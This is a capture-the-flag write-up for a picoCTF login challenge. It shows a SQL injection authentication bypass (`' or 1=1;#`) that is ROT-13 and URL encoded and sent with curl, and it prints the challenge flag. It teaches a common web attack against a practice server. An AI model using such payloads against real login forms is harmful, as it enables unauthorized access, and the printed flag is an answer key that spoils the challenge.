## Challenge

### Description
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/54253/`. Try to see if you can log in as admin!

### Hints
1- Seems like the password is encrypted.

## Resolution
This is an improved version of the previous "Irish-name-repo" challenges, so we know that the website is vulnerable to an SQL injection.
When we navigate to the login page we find a password text field.

![image](https://github.com/elomarii/ctf4day/assets/106914699/78ff3451-b440-42a0-99cc-1b06f04587b7)

We can try some inputs to see how the app will behave. When we inspect the POST request that carries the data, we find that two pieces of information are sent to the server.

![image](https://github.com/elomarii/ctf4day/assets/106914699/4ac792d9-0604-486f-b98a-9430e1bd61c3)

The `debug` value may expose how the server handles the request, thus, we provide a different value and see what will happen.

We can use `curl` utility and the following command to do so:
```
$ curl -X POST -d "password=abcd&debug=1" https://jupiter.challenges.picoctf.org/problem/54253/login.php

<pre>password: abcd
SQL query: SELECT * FROM admin where password = 'nopq'
</pre><h1>Login failed.</h1>
```

Notice that the password was encoded differently. One of the first ideas that comes to mind is that the encoding might be a Rot. It actually is, and we can use any online decoder to verify that a Rot-13 is used there.
All that's left to do is encode our injection and send it to the server.

- The payload: `pwd' or 1=1;#`
- The encoded payload: `cfj' be 1=1;#`
- Url encoded payload: `cfj%27%20be%201%3D1%3B%23`

```
$ curl -X POST -d "password=cfj%27%20be%201%3D1%3B%23&debug=1" https://jupiter.challenges.picoctf.org/problem/54253/login.php

<pre>password: cfj' be 1=1;#
SQL query: SELECT * FROM admin where password = 'psw' or 1=1;#'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_7f5767f6}</p>
```

The flag: `picoCTF{3v3n_m0r3_SQL_7f5767f6}`
